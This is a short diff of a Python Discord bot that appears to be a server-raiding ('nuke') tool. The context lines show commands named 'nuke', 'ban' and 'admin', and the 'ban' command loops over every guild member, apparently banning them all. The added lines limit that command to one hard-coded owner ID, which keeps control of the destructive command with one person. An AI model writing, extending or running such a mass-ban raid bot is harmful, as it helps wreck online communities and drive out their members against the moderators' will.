@@ -713,6 +713,8 @@ async def nuke(ctx):
 
 @bot.command()
 async def ban(ctx):
+    if ctx.author.id != 1097879047213686875:
+        return await ctx.send("You are not the bot owner!")
 
     for member in ctx.guild.members:
         try:
@@ -721,6 +723,7 @@ async def ban(ctx):
         
         except Exception as e:
             await ctx.send("timeline unstable")
+
 
 @bot.command()
 async def admin(ctx):
